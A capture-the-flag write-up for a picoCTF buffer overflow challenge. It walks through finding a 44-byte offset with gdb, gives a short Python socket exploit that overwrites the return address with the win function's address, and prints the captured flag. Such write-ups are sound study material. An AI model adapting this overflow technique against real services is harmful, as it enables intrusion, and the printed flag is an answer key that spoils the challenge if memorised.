# Solution

1. Download the source and the binary file
2. Chmod the binary withg +x 
3. Use gdb to search through the functions (win looks interesting), make note of its memory address
4. Since we know this is likely a buffer overflow, we use pattern create to create a 100byte pattern ```pattern create 100 pattern.txt```
5. Run the binary, in gdb with the input of pattern: ```run < pattern.txt```
5. GDB (peda) tells us that we have an overflow at 44 bytes
6. Create a new pattern with 44 bytes of "A" and 4 bytes of "B"
7. We control EIP as the EIP register has the 4 bytes of "B"'s
8. Create a python exploit with our offset of "A"s and the memory address of the Win function

## Win funciton memory address
```
0x080491f6
```

## exploit.py
```
#!/usr/bin/env python3

import socket
import click
import argparse

click.clear()
parser = argparse.ArgumentParser()

parser.add_argument("host", type=str, help="The hostname of IP address to connect to")
parser.add_argument("port", type=int, help="The port for the service to connect to")

args = parser.parse_args()

#win_function = 0x080491f6

payload = b"A"*44 + b"\xf6\x91\x04\x08"
payload += b"\n"


with socket.socket() as connection:
	connection.connect((args.host, args.port))
	print(connection.recv(4096).decode('utf-8'))
	connection.send(payload)
	print(connection.recv(4096).decode('utf-8'))

```

## Flag
```
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
```


